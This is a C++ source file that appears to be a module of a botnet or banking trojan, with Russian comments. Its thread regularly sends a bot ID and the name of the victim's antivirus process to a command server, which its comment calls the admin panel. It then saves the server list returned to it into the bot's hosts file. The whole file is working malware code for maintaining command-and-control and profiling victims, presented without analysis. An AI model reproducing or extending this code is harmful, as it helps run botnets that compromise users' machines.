//---------------------------------------------------------------------------

#pragma hdrstop

#include "HostsAutoUpdate.h"
#include "Config.h"
#include "BotHosts.h"
#include "BotHTTP.h"
#include "Utils.h"
#include "Modules.h"
#include "BotCore.h"
//---------------------------------------------------------------------------


#include "BotDebug.h"

namespace HostsDebugSpace
{
    #include "DbgTemplates.h"
}

#define HOSTSDBG  HostsDebugSpace::DBGOutMessage<>

//****************************************************************************
//                                THostsUpdater
//****************************************************************************
THostsUpdater::THostsUpdater()
	: TBotThread(false)
{
//	Interval = 5 * 60 * 1000;   // Интервал в отладке
	Interval = 30 * 60 * 1000;  // интервал 1 час

	Start();
}
//-----------------------------------------------------------

THostsUpdater::~THostsUpdater()
{

}
//-----------------------------------------------------------

void THostsUpdater::DoExecute()
{
	// Запускаем цикл загрузки хостов
	// передаём админке информацию об установленном антивирусе
	pSleep(4000);

	HOSTSDBG("HostsUpdater", "Запускаем обновление хостов");

	while (!Terminated())
	{
		DWORD UpdateInterval = Interval;
		Update(UpdateInterval);

		// Замораживаем поток
		pSleep(UpdateInterval);
    }

}
//-----------------------------------------------------------

void THostsUpdater::Update(DWORD &UpdateInterval)
{
	// Обновляем список хостов

	PCHAR URL = GetBotScriptURL(SCRIPT_UPDATE_HOSTS);
	if (!URL)
	{
		UpdateInterval = 30000;
		return;
    }


	#ifdef CryptHTTPH
		TCryptHTTP HTTP;
		HTTP.Password = GetMainPassword2();
	#else
		THTTP HTTP;
	#endif

	// Заполняем поля
	TBotStrings Fields;

	string AV = GetAntiVirusProcessName();
	string UID     = GenerateBotID2();

	Fields.AddValue("uid", UID.t_str());
	Fields.AddValue("av",  AV.t_str());

	HOSTSDBG("HostsUpdater", "Загружаем список хостов:\r\nURL: %s\r\nUID: %s\r\nAV: %s", URL, UID.t_str(), AV.t_str());

	// Отправляем запрос
	HTTP.CheckOkCode = false;
	string Buf;
	bool Done = HTTP.Post(URL, &Fields, Buf);
	if (!Done)
	{
		// Не удалось выполнить запрос к серверу
		UpdateInterval = 30000;
		return;
	}

	if (HTTP.Response.Code == 403 && !Buf.IsEmpty())
		SaveHosts(Buf);

	STR::Free(URL);
}
//-----------------------------------------------------------

void THostsUpdater::SaveHosts(const string &Buf)
{
	// Сохраняем список хостов
	TBotStrings H;
	H.SetText(Buf);

	PHostList List = Hosts::CreateList();

	HOSTSDBG("HostsUpdater", "Загруженные хосты:");

    bool Added = false;

	for (int i = 0; i < H.Count(); i++)
	{
		string Host = H.GetItem(i);
		if (!Host.IsEmpty())
		{
            Added = true;
			HOSTSDBG("HostsUpdater", "     %s", Host.t_str());
			Hosts::AddHost(List, Host);
        }
    }

	if (Added)
	{
		PCHAR FileName = BOT::GetHostsFileName();

		Hosts::SaveListToFile(List, FileName, true);

		STR::Free(FileName);
    }

	Hosts::FreeList(List);
}
//-----------------------------------------------------------

// Функция запускает автоматическое обновление хостов
void StartHostsUpdater()
{
	new THostsUpdater();
}